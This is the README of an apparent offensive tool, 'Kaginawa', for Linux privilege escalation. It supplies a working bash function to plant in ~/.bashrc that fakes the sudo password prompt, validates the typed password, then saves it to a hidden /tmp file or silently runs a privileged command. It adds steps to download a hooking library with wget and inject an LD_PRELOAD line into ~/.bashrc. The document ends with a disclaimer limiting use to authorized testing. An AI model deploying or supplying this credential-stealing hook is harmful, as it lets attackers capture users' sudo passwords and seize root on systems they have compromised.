# Kaginawa

A hook for helping privilege escalation

## Scenario

You have code execution on an linux account with sudo privileges but cannot find a privilege escalation exploit.

A common technique in this case is creating a "sudo proxy", which is basically a function that wraps the sudo command to capture the user's credentials or execute a privileged action.

For example, the following function can be appended to the ~/.bashrc:

```bash
REAL_SUDO=$(which sudo)
ACTION=""

sudo() {
  for ((i=0; i<3; i++)); do
    echo -n "[sudo] password for $USER: "
    read -s user_pass
    echo ""

    # Validate password
    echo "$user_pass" | $REAL_SUDO -S -v >/dev/null 2>&1
    if [ $? -ne 0 ]; then
      echo "Sorry, try again."
    else
      # Run ACTION if defined
      if [ -n "$ACTION" ]; then
        echo "$user_pass" | $REAL_SUDO -S "$ACTION" >/dev/null 2>&1 &
      else
        echo "$user_pass" >> /tmp/.X1027-lock
      fi

      # Run original command
      echo "$user_pass" | $REAL_SUDO -S -- "$@"
      break
    fi
  done
}
```

The very same attack can be performed via LD_PRELOAD hooks. Kaginawa hooks the bash's execve wrapper and run a custom command stored at "fake_argv".

- First Step: Drop kaginawa into target system. For example:

```bash
wget https://example.com/kaginawa.so
```

- Second Step: Infect ~/.bashrc

```bash
echo 'LD_PRELOAD=/full/path/to/kaginawa.so bash' >> ~/.bashrc
```

- Third Step: Patience

## Disclaimer

This tool was developed for authorized adversary simulations and penetration testing in controlled environments. 
It is intended for use only on systems you own or have explicit permission to test. 
Use responsibly and at your own risk.
